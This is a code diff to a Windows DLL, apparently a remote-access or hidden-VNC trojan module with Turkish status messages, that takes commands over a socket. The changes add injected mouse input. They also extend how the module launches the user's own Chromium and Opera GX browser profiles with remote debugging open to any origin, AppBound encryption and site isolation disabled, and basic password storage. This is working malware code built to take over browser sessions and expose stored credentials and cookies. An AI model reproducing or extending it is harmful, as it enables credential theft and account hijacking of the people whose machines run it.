@@ -1190,6 +1190,8 @@ static void input_loop() {
                 LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
 
                 SetCursorPos(screenPt.x, screenPt.y);
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
                 PostMessageW(hwnd, WM_MOUSEMOVE, mouse_wparam_for_button(btn, true), lParam);
                 PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
@@ -1223,6 +1225,8 @@ static void input_loop() {
                 ScreenToClient(hwnd, &clientPt);
 
                 SetCursorPos(screenPt.x, screenPt.y);
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
+
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
                 PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
                 PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), MAKELPARAM(clientPt.x, clientPt.y));
@@ -1257,6 +1261,11 @@ static void input_loop() {
                 WPARAM upWParam   = mouse_wparam_for_button(btn, false);
 
                 SetCursorPos(screenPt.x, screenPt.y);
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
+
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, downMsg));
                 PostMessageW(hwnd, WM_MOUSEMOVE, downWParam, lParam);
                 PostMessageW(hwnd, downMsg, downWParam, lParam);
@@ -1588,6 +1597,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     send_status("Tarayıcı başlatılıyor...");
 
                     // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
+                    wstring disableFeatures = L"AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,RendererCodeIntegrity,IsolateOrigins,site-per-process";
+                    if (wRequestedPath == L"Opera GX") {
+                        disableFeatures += L",GXC_Check_UI_Updates,GXC_Auto_Update";
+                    }
+
                     wstring args = L" --remote-debugging-port=9222"
                                    L" --user-data-dir=\"" + profilePath + L"\""
                                    L" --profile-directory=\"" + profileDir + L"\""
@@ -1606,8 +1620,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-infobars"
                                    L" --disable-gpu-compositing"
                                    L" --force-cpu-draw"
-                                   L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,RendererCodeIntegrity"
-                                   L" --password-store=basic"
+                                   L" --disable-features=" + disableFeatures + L" --password-store=basic"
                                    L" --disable-encryption-win"
                                    L" --restore-last-session"
                                    L" --allow-profiles-outside-user-dir"
@@ -1618,13 +1631,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-backgrounding-occluded-windows"
                                    L" --disable-renderer-backgrounding"
                                    L" --remote-allow-origins=*"
+                                   L" --disable-site-isolation-trials"
+                                   L" --force-color-profile=srgb"
+                                   L" --disable-software-rasterizer"
                                    L" --lang=en-US";
 
                     if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         args += L" --disable-update --no-default-browser-check";
                     }
                     if (wRequestedPath == L"Opera GX") {
-                        args += L" --disable-features=GXC_Check_UI_Updates,GXC_Auto_Update --no-custom-menu";
+                        args += L" --no-custom-menu --disable-gx-sounds --disable-gx-animations";
                     }
 
                     // Ensure exePath is properly quoted if it contains spaces
